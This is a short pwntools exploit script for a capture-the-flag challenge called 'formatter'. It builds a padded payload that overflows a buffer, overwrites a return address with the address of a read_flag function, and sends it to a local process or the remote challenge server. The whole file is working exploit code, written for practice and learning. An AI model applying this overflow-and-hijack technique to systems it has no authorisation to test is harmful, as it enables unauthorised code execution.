from pwn import *

context.binary = elf = ELF('./formatter')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('formatter.challs.olicyber.it', 20006)
elif args.GDB:
    r = gdb.debug('./formatter', '''
                  b *main+62
                  c
                  ''')
else:
    r = process('./formatter')
    
payload = b'\\b'*12 # i = 24, f_idx = 48
payload += b'a'*24  # i = 48, f_idx = 72
payload += b'a'*8   # i = 56, f_idx = 80
payload += p64(elf.sym['read_flag']) # i = 64, f_idx = 88

print(len(payload))

r.sendafter(b'.\n', payload)
r.interactive()
